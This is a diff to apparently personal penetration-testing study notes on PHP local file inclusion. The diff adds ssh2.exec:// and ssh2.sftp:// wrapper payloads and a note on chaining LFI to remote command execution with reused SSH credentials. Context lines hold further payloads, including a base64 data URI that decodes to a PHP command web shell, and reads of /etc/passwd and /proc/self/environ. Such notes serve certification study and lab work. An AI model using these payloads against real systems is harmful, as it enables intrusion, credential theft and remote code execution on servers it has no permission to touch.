@@ -144,6 +144,8 @@ php://filter/read=convert.base64-encode/resource=index.php    # read PHP source
 php://input     # with POST data containing PHP code
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=  # data URI RCE
 expect://id     # requires expect extension (rare)
+ssh2.exec://user:pass@127.0.0.1:22/id           # RCE over SSH — needs the ssh2 extension + valid creds
+ssh2.sftp://user:pass@127.0.0.1:22/etc/passwd   # file read as the SSH user (sees more than www-data)
 
 # LFI → RCE via log poisoning
 # 1. Inject PHP into User-Agent or Referer
@@ -155,6 +157,8 @@ expect://id     # requires expect extension (rare)
 ?page=../../../../proc/self/fd/0    # stdin
 ?page=../../../../proc/self/environ # environment variables
 ```
+
+> [!note] **`ssh2.exec://` / `ssh2.sftp://` — LFI → RCE over SSH when you have creds.** These only work if the PHP **`ssh2` extension is loaded** (rare — verify first by grepping a base64-read `php.ini` / `phpinfo` for `ssh2`), and an `include()` sink also needs `allow_url_include=On`. The typical chain: reused creds + SSH firewalled externally → the web server hits `localhost:22` for you. Full preconditions, procedure, and gotchas: [[Class notes/HTB Academy/CPTS v2 (claude)/File Inclusion|File Inclusion]] → *ssh2.exec:// & ssh2.sftp://*.
 
 ---
 
@@ -307,5 +311,5 @@ foreach($funcs as $f) {
 ---
 
 *Created: 2026-03-13*
-*Updated: 2026-08-18*
+*Updated: 2026-08-21*
 *Model: claude-opus-5*
